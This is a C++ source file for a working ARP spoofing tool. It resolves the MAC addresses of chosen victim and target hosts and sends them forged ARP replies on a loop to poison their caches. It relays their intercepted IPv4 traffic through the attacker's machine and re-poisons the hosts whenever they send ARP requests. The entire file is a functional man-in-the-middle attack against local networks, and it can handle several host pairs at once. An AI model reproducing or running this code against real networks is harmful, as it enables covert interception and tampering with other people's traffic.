#include "arp_spoof.h"

t_list	*infos;
pthread_mutex_t	SendPacketMutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t RecievePacketMutex = PTHREAD_MUTEX_INITIALIZER;

void	print_packet(const u_char *packet)
{
	printf("src mac: %s\n", std::string(((EthHdr *)packet)->smac()).data());
	printf("dst mac: %s\n", std::string(((EthHdr *)packet)->dmac()).data());
	printf("src ip: %s\n", std::string(((EthIpPacket *)packet)->ip_.sip()).data());
	printf("dst ip: %s\n", std::string(((EthIpPacket *)packet)->ip_.dip()).data());
}

int	getAttackerInfo(t_info *attacker, char *dev)
{
	struct ifreq	data;
   	int				fd;
	
	fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(data.ifr_name, dev);
	// get MAC addr
	if (!ioctl(fd, SIOCGIFHWADDR, &data))
		attacker->mac = Mac((uint8_t *)data.ifr_hwaddr.sa_data);
	else
		return (1);
	if (!ioctl(fd, SIOCGIFADDR, &data))
		attacker->ip = Ip(ntohl(((struct sockaddr_in*)&data.ifr_addr)->sin_addr.s_addr));
	else
		return (1);
	printf("[INFO] Attacker's mac addr: %s\n", std::string(attacker->mac).data());
	printf("[INFO] Attacker's ip  addr: %s\n", std::string(attacker->ip).data());
	close(fd);

	return (0);
}

int	SendARPPacket(pcap *handle, int mode, Mac eth_smac, Mac eth_dmac, t_info arp_sender, t_info arp_target)
{
	EthArpPacket	packet;

	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	if (mode)
		packet.arp_.op_ = htons(ArpHdr::Reply);
	else
		packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = arp_sender.mac;
	packet.arp_.sip_ = htonl(arp_sender.ip);
	packet.arp_.tmac_ = arp_target.mac;
	packet.arp_.tip_ = htonl(arp_target.ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res) {
		fprintf(stderr, "Error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return (1);
	}
	return (0);
}

int	resolveMacInfo(pcap_t *handle, t_info attacker, t_info *target)
{
	struct pcap_pkthdr	*header;
	const u_char		*packet;
	t_info				tmp;
	int					maximum_try = 5;

	while (1 && (maximum_try--) > 0) // recv
	{
		// send packet to sender
		if (SendARPPacket(handle, 0, attacker.mac, Mac::broadcastMac(), attacker, *target))
			return (1);
		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) return (1);
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "Error: pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return (1);
		}
		if (((EthHdr *)packet)->type() != ((EthHdr *)packet)->Arp) // Check packet is ARP
			continue ;
		EthArpPacket	*respacket = (EthArpPacket *)packet;
		if (respacket->eth_.dmac() == attacker.mac && respacket->arp_.sip() == target->ip && respacket->arp_.tmac() == attacker.mac && respacket->arp_.tip() == attacker.ip) 
		{ // check this packet is reply for My sendpacket
			target->mac = respacket->eth_.smac();
			// printf("MAC addr: %s\n", std::string(target->mac).data());
			return (0);
		}
	}
	return (1);
}

int	ft_isSpoofed(const u_char *packet, t_spoof *arg)
{
	if (((EthHdr *)packet)->type() == ((EthHdr *)packet)->Ip4) // check relay only ip4 packet
	{
		EthIpPacket	*ippacket = (EthIpPacket *)packet;
		// check packet is spoofed
		if (ippacket->ip_.sip() == arg->Sender.ip && ippacket->eth_.dmac() == arg->Attacker.mac && ippacket->ip_.dip() != arg->Attacker.ip) // from sender to target
			return (1);
		if (ippacket->ip_.sip() != arg->Attacker.ip && ippacket->eth_.dmac() == arg->Attacker.mac && ippacket->ip_.dip() == arg->Sender.ip) // from target sender
			return (1);
	}
	return (0);
}

void	*ft_infect(void	*arg)
{
	t_spoof		*spoof;
	t_info		tmp;

	spoof = (t_spoof *)arg;
	tmp.mac = spoof->Attacker.mac;
	while (1)
	{
		// infect Sender
		tmp.ip = spoof->Target.ip;
		pthread_mutex_lock(&SendPacketMutex); // starvation
		if (SendARPPacket(spoof->handle, 1, spoof->Attacker.mac, spoof->Sender.mac, tmp, spoof->Sender))
			printf("Error: Fail infect sender.\n");
		pthread_mutex_unlock(&SendPacketMutex);
		// infect Target
		tmp.ip = spoof->Sender.ip;
		pthread_mutex_lock(&SendPacketMutex);
		if (SendARPPacket(spoof->handle, 1, spoof->Attacker.mac, spoof->Target.mac, tmp, spoof->Target))
			printf("Error: Fail infect target.\n");
		pthread_mutex_unlock(&SendPacketMutex);
		for (int i =0; i< 1000;i++)
			usleep(3000);
	}

	return (0);
}

void	ft_relayPacket(const u_char *packet, t_spoof *spoof, struct pcap_pkthdr *header)
{
	EthIpPacket	*ippacket = (EthIpPacket *)packet;
	print_packet(packet);
	printf("%s->%s\n", std::string(spoof->Sender.mac).data(), std::string(spoof->Target.mac).data());
	// change mac addr
	if (ippacket->eth_.smac() == spoof->Sender.mac) // from sender to target
		ippacket->eth_.dmac_ = spoof->Target.mac;
	else if (ippacket->eth_.smac() == spoof->Target.mac)
		ippacket->eth_.dmac_ = spoof->Sender.mac;
	ippacket->eth_.smac_ = spoof->Attacker.mac;

	// send packet
	printf("relay packet... %s->%s\n", std::string(ippacket->ip_.sip()).data(), std::string(ippacket->ip_.dip()).data());
	pthread_mutex_lock(&SendPacketMutex);
	int res = pcap_sendpacket(spoof->handle, reinterpret_cast<const u_char*>(ippacket), header->len);
	pthread_mutex_unlock(&SendPacketMutex);
	if (res) {
		fprintf(stderr, "Error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(spoof->handle));
		return ;
	}
}

int	ft_isARPRequest(const u_char *packet, t_spoof *spoof)
{
	if (((EthHdr *)packet)->type() == ((EthHdr *)packet)->Arp) // check packet is ARP
	{
		EthArpPacket	*respacket = (EthArpPacket *)packet;

		// check packet is request
		if (respacket->arp_.op() == ArpHdr::Reply) // reply
			return (0); // not request
		// check packet is unicast to attacker
		if (respacket->eth_.dmac() == spoof->Attacker.mac)
			return (1);
		// check packet is broadcast
		if (respacket->eth_.dmac() == Mac::broadcastMac() && (respacket->arp_.tip() == spoof->Sender.ip || respacket->arp_.tip() == spoof->Target.ip))
			return (1);
	}
	return (0);
}

void	ft_reinfect(const u_char *packet, t_spoof *spoof)
{
	EthArpPacket	*respacket = (EthArpPacket *)packet;
	t_info			tmp_sender, tmp_target;

	tmp_sender.mac = spoof->Attacker.mac;
	tmp_target.mac = respacket->arp_.smac();
	tmp_sender.ip = respacket->arp_.tip();
	tmp_target.ip = respacket->arp_.sip();
	// send reply
	usleep(5000); // reply after real reply
	printf("\nreinfect %s\n\n", std::string(tmp_target.mac).data());
	pthread_mutex_lock(&SendPacketMutex);
	SendARPPacket(spoof->handle, 1, spoof->Attacker.mac, respacket->eth_.smac(), tmp_sender, tmp_target); // make fake reply
	pthread_mutex_unlock(&SendPacketMutex);
}

void	*ft_receive(void *arg)
{
	t_list				*list;
	struct pcap_pkthdr	*header;
	const u_char		*packet;

	list = (t_list *)arg;
	while(1)
	{
		int res = pcap_next_ex(list->content.handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "Error: pcap_next_ex return %d(%s)\n", res, pcap_geterr(list->content.handle));
			continue;
		}
		t_list *tmp = list;
		while (tmp)
		{
			t_spoof *spoof = (t_spoof *)&(tmp->content);
			if (ft_isSpoofed(packet, spoof))
			{
				ft_relayPacket(packet, spoof, header); // relay packet to target
				break ;
			}
			if (ft_isARPRequest(packet, spoof))
			{
				ft_reinfect(packet, spoof); // reply ARP request
				break ;
			}
			tmp = tmp->next;
		}
		usleep(100); // starvation

	}

	return (0);
}

int	main(int argc, char *argv[])
{
	if (argc < 4 || argc % 2)
	{
		fprintf(stderr, "Usage: %s <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n", argv[0]);
		return (1);
	}
	t_spoof		spoof;
	char		*dev = argv[1];
	char		errbuf[PCAP_ERRBUF_SIZE];
	
	memset(&spoof, 0, sizeof(t_spoof));
	if (getAttackerInfo(&(spoof.Attacker), dev))
	{
		fprintf(stderr, "Error: get Attackers MAC & IP\n");
		return (1);
	}
	spoof.handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (!spoof.handle)
	{
		fprintf(stderr, "Error: Couldn't open device %s(%s)\n", dev, errbuf);
		return (1);
	}
	for (int i = 2; i < argc; i+=2)
	{
		spoof.Sender.ip = Ip(argv[i]);
		spoof.Target.ip = Ip(argv[i + 1]);
		if (resolveMacInfo(spoof.handle, spoof.Attacker, &(spoof.Sender)) + resolveMacInfo(spoof.handle, spoof.Attacker, &(spoof.Target)) != 0)
		{
			printf("Error: [%d arp spoof]Couldn't get sender & target mac.\n", (i - 2) / 2 + 1);
			return (1);
		}
		ft_lstadd(&infos, ft_lstnew(&spoof)); // add data to list
		printf("Victim: %s, Target: %s\n", std::string(spoof.Sender.mac).data(), std::string(spoof.Target.mac).data());
		printf("ARP Spoofing: Victim: %s, Target: %s\n", std::string(spoof.Sender.ip).data(), std::string(spoof.Target.ip).data());
		usleep(3000);
	}
	t_list	*tmp = infos;
	pthread_t	recieveThread;
	while (tmp) // make thread for each infect & recieve
	{
		printf("in..\n");
		if (pthread_create(&(tmp->content.thread), NULL, ft_infect, (void *)(&tmp->content)))
		{
			fprintf(stderr, "Error: pthread_create\n");
			return (1);
		}
		// if (pthread_create(&(tmp->content.thread[1]), NULL, ft_receive, (void *)(&tmp->content)))
		// {
		// 	fprintf(stderr, "Error: pthread_create\n");
		// 	return (1);
		// }
		printf("Thread created...\n");
		tmp = tmp->next;
	}
	if (pthread_create(&recieveThread, NULL, ft_receive, (void *)infos))
	{
		fprintf(stderr, "Error: pthread_create\n");
		return (1);
	}
	pthread_join(recieveThread, NULL);
	tmp = infos;
	while (tmp)
	{
		pthread_join(tmp->content.thread, NULL);
		tmp = tmp->next;
	}
	pthread_mutex_destroy(&SendPacketMutex);
	pthread_mutex_destroy(&RecievePacketMutex);
	ft_lstclear(&infos);
	pcap_close(spoof.handle);
}
